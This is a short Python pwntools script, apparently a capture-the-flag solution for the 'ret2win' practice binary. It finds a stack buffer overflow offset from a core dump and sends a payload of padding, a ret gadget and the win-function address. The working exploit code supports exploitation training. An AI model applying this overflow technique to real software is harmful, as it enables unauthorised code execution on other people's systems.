#!/usr/bin/env python3

"""Exploiting ret2win

Simple buffer overflow with adding an address at the end to execute

Usage: $ python3 ret2win.py ret2win
"""

import sys

from pwn import *

# context.log_level = "DEBUG"

if len(sys.argv) < 2:
    print(f"Usage: python3 {sys.argv[0]} BINARY")
    exit(0)

context.binary = sys.argv[1]

p = process(context.binary.path)
p.sendline(cyclic(1024))
p.wait()
p.close()

core = Coredump("./core")
print(f"SEGFAULT Address: {core.fault_addr}")
offset = cyclic_find(core.fault_addr)

log.info(f"Offset found: {offset}")

# p = gdb.debug(context.binary.path, gdbscript="init-gef")
p = process(context.binary.path)

gadget_ret2win = 0x400756
gadget_ret = 0x40053e

payload = b"a" * (offset)
payload += p64(gadget_ret)
payload += p64(gadget_ret2win)

p.sendline(payload)
p.interactive()
